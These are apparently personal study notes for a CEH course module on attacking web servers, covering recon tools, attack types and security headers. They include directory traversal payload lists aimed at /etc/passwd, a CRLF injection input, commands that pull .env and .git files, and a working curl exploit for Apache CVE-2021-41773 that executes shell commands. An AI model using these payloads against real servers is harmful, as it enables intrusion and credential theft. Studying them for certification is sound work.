# CEH Module 13 — Hacking Web Servers

**Author:** Nivedhitha KS | **Day:** 15 of 60  
**GitHub:** github.com/NivedhithaKS-SEC/cybersec-journey

---

## 1. Web Server Concepts

### What is a Web Server?
A web server is software that serves HTTP/HTTPS content to clients. It listens on ports 80 (HTTP) and 443 (HTTPS), processes requests, and returns responses.

### Common Web Servers

| Server | Default Port | Market Share | Config file |
|--------|-------------|-------------|------------|
| **Apache HTTP Server** | 80/443 | ~31% | `/etc/apache2/apache2.conf` |
| **Nginx** | 80/443 | ~34% | `/etc/nginx/nginx.conf` |
| **Microsoft IIS** | 80/443 | ~10% | IIS Manager (GUI) |
| **LiteSpeed** | 80/443 | ~12% | `/usr/local/lsws/conf/` |
| **Tomcat** | 8080/8443 | Common for Java | `/etc/tomcat/server.xml` |

### Web Server Attack Surface

```
Internet → [Firewall] → [Load Balancer] → [Web Server] → [App Server] → [Database]
                                              ↑
                                    Attack surface here:
                                    - Software vulnerabilities (unpatched)
                                    - Misconfigurations
                                    - Default files/credentials
                                    - Information disclosure
                                    - Directory traversal
                                    - File inclusion
```

---

## 2. Web Server Attack Types

### Attack 1 — Directory Traversal (Path Traversal)

**What it is:** Access files outside the web root by manipulating file path parameters using `../` sequences.

**How it works:**
```
Normal request:  http://target.com/page?file=about.html
                 → Server reads: /var/www/html/about.html  ✓

Traversal:       http://target.com/page?file=../../../etc/passwd
                 → Server reads: /etc/passwd  ✗ (exposed!)
```

**Payloads to try:**
```
../../../etc/passwd                         # Basic Linux
..%2F..%2F..%2Fetc%2Fpasswd               # URL encoded /
..%252F..%252F..%252Fetc%252Fpasswd        # Double URL encoded
....//....//....//etc/passwd               # Filter bypass
..\/..\/..\/etc\/passwd                    # Backslash variant
/etc/passwd%00                             # Null byte (old PHP)
```

**Windows targets:**
```
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\boot.ini
```

**Why it works:** When the application doesn't sanitise or validate file path input. A simple `../` removal can be bypassed with `....//` or URL encoding.

---

### Attack 2 — Banner Grabbing (Information Disclosure)

**What it is:** Reading HTTP response headers to identify server software, version, and technology stack. This information is used to find known CVEs.

**Methods:**
```bash
# Method 1: curl headers
curl -I http://target.com
# Response:
# Server: Apache/2.4.41 (Ubuntu)
# X-Powered-By: PHP/7.4.3

# Method 2: Netcat
nc -nv target.com 80
GET / HTTP/1.0
[press Enter twice]

# Method 3: Telnet
telnet target.com 80
GET / HTTP/1.0

# Method 4: Nmap service detection
nmap -sV -p 80,443,8080 target.com

# Method 5: WhatWeb
whatweb http://target.com
# Output: Apache[2.4.41], PHP[7.4.3], WordPress[5.8.1]
```

**What to do with banner info:**
```bash
# Search Exploit-DB for the exact version
searchsploit apache 2.4.41
searchsploit nginx 1.14
searchsploit "IIS 7.5"

# Check CVE directly
# https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=apache+2.4.41
```

**Server hardening — hide banners:**
```apache
# Apache: /etc/apache2/apache2.conf
ServerTokens Prod          # Only shows "Apache"
ServerSignature Off        # Remove version from error pages
```

---

### Attack 3 — HTTP Response Splitting

**What it is:** Injecting CRLF (`\r\n`) characters into HTTP response headers to split one response into two, allowing header injection or cache poisoning.

**How it works:**
```
Vulnerable URL: http://target.com/redirect?url=http://google.com

Malicious input: http://google.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK...

%0d = carriage return (\r)
%0a = newline (\n)

Result: Server sends TWO responses — second one is attacker-controlled
```

**Impact:** Cache poisoning (poisoned response cached for all users), XSS via injected headers, credential theft.

---

### Attack 4 — Web Cache Poisoning

**What it is:** Trick a caching layer (CDN, reverse proxy) into storing a malicious response and serving it to all subsequent visitors.

**Attack flow:**
```
1. Find a cache key parameter the server ignores but caches
2. Inject malicious content via that parameter
3. Cache stores the poisoned response
4. All users requesting that URL receive the malicious page
```

**Detection:** Look for `X-Cache: HIT` or `CF-Cache-Status: HIT` headers — confirms caching is active.

---

### Attack 5 — HTTP Request Smuggling

**What it is:** Exploit discrepancies between how a front-end (load balancer/proxy) and back-end server parse HTTP request boundaries.

```
Front-end reads Content-Length header → sees 1 request
Back-end reads Transfer-Encoding header → sees 2 requests
Second "request" is attacker-controlled → bypasses security controls
```

**Impact:** Bypass WAF/access controls, steal other users' requests, cache poisoning.

---

### Attack 6 — Misconfiguration Exploitation

**Common web server misconfigurations:**

| Misconfiguration | Risk | Check with |
|-----------------|------|-----------|
| Directory listing enabled | Exposes all files | Browse to `/uploads/` — see file list? |
| Default credentials | Admin access | Try `admin:admin`, `admin:password` |
| Unnecessary HTTP methods | PUT/DELETE enable file upload/deletion | `curl -X OPTIONS http://target.com` |
| .git exposed | Source code disclosure | `http://target.com/.git/config` |
| .env exposed | Credentials in plaintext | `http://target.com/.env` |
| Backup files | Source code + credentials | Try `.bak`, `.old`, `~` extensions |
| Server status page | Internal server info | `/server-status`, `/server-info` |

```bash
# Check for dangerous HTTP methods
curl -X OPTIONS http://target.com -v
# Look for: Allow: GET, POST, PUT, DELETE, TRACE

# Test TRACE (can steal cookies via XST attack)
curl -X TRACE http://target.com -v

# Check common sensitive files
curl http://target.com/.git/config
curl http://target.com/.env
curl http://target.com/phpinfo.php
curl http://target.com/wp-config.php.bak
```

---

## 3. Web Server Recon Tools

### Tool 1 — Nikto
Nikto is a web server scanner that checks for thousands of known vulnerabilities, misconfigurations, and outdated software.

```bash
# Basic scan
nikto -h http://target.com

# Scan specific port
nikto -h http://target.com -p 8080

# Scan with authentication
nikto -h http://target.com -id admin:password

# Save output
nikto -h http://target.com -o nikto_results.html -Format html

# Scan using SSL
nikto -h https://target.com -ssl

# Tune scan (select specific checks)
nikto -h http://target.com -Tuning 1    # Interesting files
nikto -h http://target.com -Tuning 2    # Misconfiguration
nikto -h http://target.com -Tuning 4    # XSS
```

**What Nikto finds:**
- Outdated server software versions
- Default files (test.php, phpinfo.php, install.php)
- Dangerous HTTP methods enabled
- Missing security headers
- Known CVEs for detected versions

---

### Tool 2 — Gobuster (Directory Brute Force)
Gobuster brute-forces hidden directories and files by trying wordlist entries one by one.

```bash
# Install
sudo apt install gobuster

# Basic directory scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak

# Faster with threads
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# Follow redirects
gobuster dir -u http://target.com -w wordlist.txt -r

# DNS subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains-top1million-5000.txt
```

**Wordlists location on Kali:**
```
/usr/share/wordlists/dirb/common.txt          (4,615 entries — fast)
/usr/share/wordlists/dirb/big.txt             (20,469 entries — thorough)
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  (220,560 — slow but complete)
```

---

### Tool 3 — WhatWeb (Fingerprinting)
Identifies web technologies: CMS, framework, server, JavaScript libraries, analytics.

```bash
# Basic fingerprint
whatweb http://target.com

# Verbose output
whatweb -v http://target.com

# Aggressive mode (more requests = more info)
whatweb -a 3 http://target.com

# Scan multiple targets
whatweb -i targets.txt

# Output to file
whatweb http://target.com -o results.json --log-json
```

---

### Tool 4 — WafW00f (WAF Detection)
Detects if a Web Application Firewall is protecting the target.

```bash
# Install
pip install wafw00f

# Detect WAF
wafw00f http://target.com

# Verbose
wafw00f -v http://target.com

# Try to fingerprint specific WAF
wafw00f -a http://target.com    # Test all WAF signatures
```

**Common WAFs:**
- Cloudflare
- AWS WAF
- ModSecurity (open source)
- Akamai Kona
- F5 BIG-IP ASM

**Why WAF detection matters:** Different WAFs have different bypass techniques. Knowing which WAF is in place lets you choose the right evasion approach.

---

## 4. Patch Management Attacks

Most web server compromises target known, patched vulnerabilities on unpatched servers. Always check detected versions against public exploit databases.

### Real-World Example — Apache CVE-2021-41773
```bash
# Apache 2.4.49 had a path traversal + RCE vulnerability
# Searchsploit
searchsploit apache 2.4.49

# The payload:
curl -s --path-as-is "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# RCE version:
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" \
  "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

This CVE was patched within days but thousands of servers remained unpatched for months.

---

## 5. Security Headers (What a Well-Configured Server Has)

```bash
# Check what security headers are present
curl -I https://target.com

# Important headers to look for:
```

| Header | Purpose | Missing = Risk |
|--------|---------|---------------|
| `Strict-Transport-Security` | Force HTTPS | SSL stripping attacks |
| `Content-Security-Policy` | Control resource loading | XSS attacks |
| `X-Frame-Options` | Prevent clickjacking | Iframe attacks |
| `X-Content-Type-Options` | Prevent MIME sniffing | Content injection |
| `Referrer-Policy` | Control referrer info | Information leakage |
| `Permissions-Policy` | Control browser features | Feature abuse |

Missing security headers are **reportable findings** in VDP/bug bounty programs.

---

## 6. Full Attack Methodology (Web Server)

```
Phase 1 — Footprinting
├── Banner grabbing (curl -I, nmap -sV)
├── Technology fingerprinting (whatweb)
├── WAF detection (wafw00f)
└── Subdomain enumeration (gobuster dns)

Phase 2 — Scanning
├── Port scan (nmap -sV -p- target)
├── Directory brute force (gobuster dir)
├── Vulnerability scan (nikto)
└── Search CVEs for detected versions (searchsploit)

Phase 3 — Exploitation
├── Directory traversal (test file= parameters)
├── Misconfiguration abuse (PUT method, .git, .env)
├── Known CVE exploitation (Metasploit or manual)
└── Default credentials (admin panel, /phpmyadmin, /wp-admin)

Phase 4 — Post-Exploitation
├── Read sensitive files (/etc/passwd, config files)
├── Escalate to shell (web shell upload)
└── Document findings for report
```

---

## 7. Quick Reference — All Commands

```bash
# Recon
curl -I http://target.com                        # Headers + server version
nmap -sV -p 80,443,8080,8443 target.com          # Service detection
whatweb http://target.com                         # Technology fingerprint
wafw00f http://target.com                         # WAF detection

# Scanning
nikto -h http://target.com                        # Vulnerability scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Directory Traversal Testing
curl "http://target.com/page?file=../../../etc/passwd"
curl "http://target.com/page?file=..%2F..%2F..%2Fetc%2Fpasswd"

# HTTP Method Check
curl -X OPTIONS http://target.com -v

# Sensitive Files
curl http://target.com/.git/config
curl http://target.com/.env
curl http://target.com/phpinfo.php

# Exploit Research
searchsploit apache 2.4
searchsploit nginx 1.18
```

---

*Day 15 — 60-Day Cybersecurity Journey | github.com/NivedhithaKS-SEC/cybersec-journey*
